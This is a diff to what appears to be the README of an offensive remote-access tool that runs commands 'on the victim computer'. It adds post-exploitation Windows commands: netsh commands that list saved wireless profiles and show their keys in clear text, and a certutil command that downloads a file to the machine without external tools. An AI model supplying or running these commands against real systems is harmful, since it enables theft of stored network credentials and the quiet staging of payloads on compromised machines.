@@ -26,10 +26,13 @@ You can run commands on the victim computer by taking advantage of the RPC featu
 
 # Some usefull shell commands
 
-Some functional command examples listed below. 
+Some functional command examples listed below and [more](https://github.com/security-cheatsheet/cmd-command-cheat-sheet). 
 > fsutil fsinfo drives : Get fixed disk drives list.
+> netsh wlan show profiles : List stored wireless connection profiles.
+> netsh wlan show profile name=<SSID Name> key=clear : Show stored wireless key as clear text.
+> certutil.exe -urlcache -split -f "url" setup.exe : Downloads a file from command line without any external tool.
 
-[cmd cheat sheet](https://github.com/security-cheatsheet/cmd-command-cheat-sheet)
+
 
 # Further Steps
 
